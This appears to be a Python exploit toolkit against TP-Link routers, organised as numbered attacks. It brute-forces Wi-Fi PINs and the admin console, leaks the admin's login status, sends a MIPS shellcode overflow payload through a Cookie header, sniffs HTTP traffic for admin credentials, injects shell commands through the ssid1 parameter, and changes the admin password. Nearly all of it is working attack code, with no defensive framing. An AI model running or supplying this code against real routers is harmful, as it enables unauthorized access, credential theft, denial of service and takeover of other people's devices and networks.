import subprocess
import time
import hashlib
import base64
import urllib.parse
import requests
import re
import threading
from pwn import *
import pyshark
from urllib.parse import unquote

keep_running = True


# Attack 1 - SSID PIN Brute Force
def ssid_authentication(ssid: str, pin: str) -> bool:
    subprocess.run(
        ["nmcli", "connection", "delete", ssid],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )

    try:
        cmd = [
            "nmcli",
            "--wait",
            "4",
            "device",
            "wifi",
            "connect",
            ssid,
            "password",
            pin,
        ]
        result = subprocess.run(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )

        if "successfully activated" in result.stdout.lower():
            print(f"Connected to {ssid} with PIN: {pin}")
            return True

    except subprocess.TimeoutExpired:
        subprocess.run(
            ["nmcli", "connection", "delete", ssid],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        return False
    except Exception as e:
        print(f"Error: {e}")
        return False

    subprocess.run(
        ["nmcli", "connection", "delete", ssid],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    print(f"Failed to connect to {ssid} within the timeout. Moving on...")
    return False


def ssid_brute(ssid: str) -> None:
    print("\n" + "═" * 83)
    print("1 — TP-LINK SSID Brute Force   | 2 - Phone Number Brute Force ")
    print("═" * 83 + "\n")

    choice = input("Select an option: ").strip()
    if choice == "1":
        for i in range(52445720, 52445730):
            pin = f"{i:08d}"
            if ssid_authentication(ssid, pin):
                break
    elif choice == "2":
        area_code = input("What is the area code?: ").strip()
        for num in range(10000000):
            rest = f"{num:07d}"
            ssid_authentication(ssid, f"{area_code}{rest}")
    else:
        print("Invalid option")


# Attack 2 Information Disclosure
def query_admin_status(target_url: str) -> None:
    try:
        response = requests.get(target_url)
        if response.status_code == 200:
            normalized_html = "".join(response.text.split())

            if "httpAutErrorArray=newArray(0," in normalized_html:
                print(
                    "[+] Information Disclosure: Admin user is currently logged into the TP-Link"
                )
            else:
                print("[-] Admin user is not logged into the TP-Link.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Connection error: {e}")


# Attack 3 Admin Console Brute Force
def attempt_admin_login(target_url: str, token: str) -> bool:
    session_cookie = {"Authorization": token}
    headers = {
        "Referer": target_url,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    }
    try:
        response = requests.get(
            target_url + "userRpm/LoginRpm.htm?Save=Save",
            cookies=session_cookie,
            headers=headers,
            timeout=3,
        )

        if response.status_code == 200 and "httpAutErrorArray" not in response.text:
            return True
    except requests.exceptions.RequestException as e:
        print(f"[!] Connection error: {e}")
    return False


def generate_tp_link_auth_token(password: str) -> str:
    password_md5 = hashlib.md5(password.encode("utf-8")).hexdigest()

    credential_string = f"admin:{password_md5}"

    b64_bytes = base64.b64encode(credential_string.encode("utf-8"))
    b64_string = b64_bytes.decode("utf-8")

    token = f"Basic {b64_string}"
    return urllib.parse.quote(token)


def brute_force_login(target_url: str, password_list: list) -> None:
    passwords = []
    with open(password_list, "r", encoding="utf-8", errors="ignore") as file:
        for line in file:
            password = line.strip()
            passwords.append(password)
    print("[*] Attempting Password Brute Force on Admin Console")
    for password in passwords:
        token = generate_tp_link_auth_token(password)
        if attempt_admin_login(target_url, token):
            print(
                f"[+] Successfully authenticated as Admin with password: [{password}] at: {target_url}."
            )
            return password
        else:
            print(
                f"[-] Authentication unsuccessful with password: [{password}], trying next password"
            )


# Attack 4 Denial of Service


def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    finally:
        s.close()


def dos_admin_portal(target_url: str):
    context(arch="mips", endian="big", os="linux")

    io = remote(target_url, 80)

    nop = asm("addiu $a0, $a0, 0x4141")
    ra_addr = 0x7CFFFA90
    avoid = b"\x00\x0a\x0d" + string.ascii_lowercase.encode()

    read_shell = asm(shellcraft.findpeer(io.lport))
    read_shell += asm(shellcraft.read("$s0", ra_addr, 0x200))
    read_shell += asm(f"""
        lui $t9, {ra_addr >> 16}
        ori $t9, $t9, {ra_addr & 0xFFFF}
        jalr $t9
        addiu $a0, $a0, 0x4141
    """)

    payload = b"F" * 16
    payload += p32(ra_addr)
    payload += nop * 100
    payload += read_shell

    # Construct HTTP GET request with headers
    request = b"GET /loginFs/passwd HTTP/1.1\r\n"
    request += f"Host: {target_url}\r\n".encode()
    request += f"Referer: http://{target_url}/\r\n".encode()
    request += b"Cookie: " + payload + b"\r\n"
    request += b"Upgrade-Insecure-Requests: 1\r\n"
    request += b"\r\n"

    io.send(request)
    print(f"[+] The Admin Portal has been successfully taken down!")


# Attack 5 - listening for password/cookie
def listen_for_admin(target_ip: str):
    threading.Thread(target=packet_capture, args=(target_ip), daemon=True).start()


def packet_capture(target_ip: str):
    capture = pyshark.LiveCapture(interface="en0")

    for packet in capture.sniff_continuously():
        if "ip" not in packet:
            print(packet)
            continue
        if packet["ip"].dst == target_ip:
            if "http" in packet:
                fields = packet.http._all_fields
                if "http.cookie_pair" in fields:
                    cookie = unquote(fields["http.cookie_pair"])
                    if cookie.startswith("Authorization"):
                        auth_encoded_string = cookie.removeprefix(
                            "Authorization=Basic"
                        ).strip()
                        creds_string = base64.b64decode(auth_encoded_string).decode(
                            "UTF-8"
                        )
                        username, password = creds_string.split(":")
                        print("Found credential pair:", username, password)


def get_sessionID(target_url: str, token: str) -> str:
    if not target_url.endswith("/"):
        target_url += "/"
    session_cookie = {"Authorization": token}
    headers = {
        "Referer": target_url,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    }

    try:
        response = requests.get(
            target_url + "userRpm/LoginRpm.htm?Save=Save",
            cookies=session_cookie,
            headers=headers,
        )

        if response.status_code == 200 and "httpAutErrorArray" not in response.text:
            match = re.search(r"/([A-Z0-9]{16})/userRpm", response.text)

            if match:
                return match.group(1)
            else:
                print("[!] Login succeeded, but Session ID pattern not found.")
                return None
    except requests.exceptions.RequestException as e:
        print(f"[!] Connection error: {e}")

    return None


def listen_for_stop():
    global keep_running
    while keep_running:
        user_input = input().strip().lower()
        if user_input == "s":
            print("\n[*] Stopping the lightshow :(")
            keep_running = False
            break


def lightshow(target_url: str, password: str):
    global keep_running
    token = generate_tp_link_auth_token(password)
    session_id = get_sessionID(target_url, token)
    keep_running = True
    stop_thread = threading.Thread(target=listen_for_stop, daemon=True)
    stop_thread.start()
    print("[*] Lightshow starting now. Press 's' to stop.")
    session_cookie = {"Authorization": token}
    round = 0
    while keep_running:
        if round % 2 == 0:
            change_filter = "Disfilter"
            ref_filter = "Enfilter"
            print(f"[-] Turning off")
        else:
            change_filter = "Enfilter"
            ref_filter = "Disfilter"
            print(f"[+] Turning on")
        referer = f"{target_url}{session_id}/userRpm/LedCtrlRpm.htm?{change_filter}=1"
        headers = {
            "Referer": referer,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
        }
        try:
            response = requests.get(
                target_url
                + session_id
                + "/userRpm/LedCtrlRpm.htm?"
                + ref_filter
                + "=1",
                cookies=session_cookie,
                headers=headers,
            )
        except requests.exceptions.RequestException as e:
            print(f"[!] Connection error: {e}")
        round += 1

        for _ in range(5):
            if not keep_running:
                break
            time.sleep(0.1)


# Attack 6 - Command injection


def command_injection(target_url: str, password: str, command: str) -> None:
    print(f"[*] Executing {command} on TP-Link router")
    token = generate_tp_link_auth_token(password)
    session_id = get_sessionID(target_url, token)

    session_cookie = {"Authorization": token}
    referer = f"{target_url}{session_id}/userRpm/MenuRpm.htm"
    headers = {
        "Referer": referer,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    }

    params = {
        "ssid1": "INL" + str(random.randint(0, 50)) + "; " + command,
        "ssid2": "TP-LINK_0000_2",
        "ssid3": "TP-LINK_0000_3",
        "ssid4": "TP-LINK_0000_4",
        "region": "101",
        "band": "0",
        "mode": "6",
        "chanWidth": "2",
        "channel": "15",
        "rate": "59",
        "ap": "1",
        "broadcast": "2",
        "addrType": "1",
        "keytype": "1",
        "authtype": "1",
        "keytext": "",
        "Save": "Save",
    }

    try:
        vulnerable_endpoint = f"{target_url}{session_id}/userRpm/WlanNetworkRpm.html"
        response = requests.get(
            vulnerable_endpoint,
            params=params,
            cookies=session_cookie,
            headers=headers,
            timeout=5000,
        )
        print("payload sent: ", response.request.path_url)
    except requests.exceptions.RequestException as e:
        print(f"[!] Connection error: {e}")


def encode_password(password: str) -> str:
    password_md5 = hashlib.md5(password.encode("utf-8")).hexdigest()
    b64_bytes = base64.b64encode(password_md5.encode("utf-8"))
    hash_string = b64_bytes.decode("utf-8")
    return urllib.parse.quote(hash_string)


def change_password(target_url: str, current_password: str, new_password: str) -> str:
    print(f"[*] Changing Admin password to {new_password} on TP-Link router")
    token = generate_tp_link_auth_token(current_password)
    session_id = get_sessionID(target_url, token)

    session_cookie = {"Authorization": token}
    referer = f"{target_url}{session_id}/userRpm/ChangeLoginPwdRpm.htm"
    headers = {
        "Referer": referer,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    }

    old_pass = encode_password(current_password)
    new_pass = encode_password(new_password)
    try:
        response = requests.get(
            target_url
            + session_id
            + "/userRpm/ChangeLoginPwdRpm.htm?oldname=admin&oldpassword="
            + old_pass
            + "&newname=admin&newpassword="
            + new_pass
            + "&newpassword2="
            + new_pass
            + "&Save=Save",
            cookies=session_cookie,
            headers=headers,
        )
        if response.status_code == 200 and "httpAutErrorArray" not in response.text:
            print(f"[+] Password changed successfully!")
            return new_password
        else:
            print(
                "[-] Password was not able to be changed successfully (Try again with a different password)"
            )
        return current_password

    except requests.exceptions.RequestException as e:
        print(f"[!] Connection error: {e}")
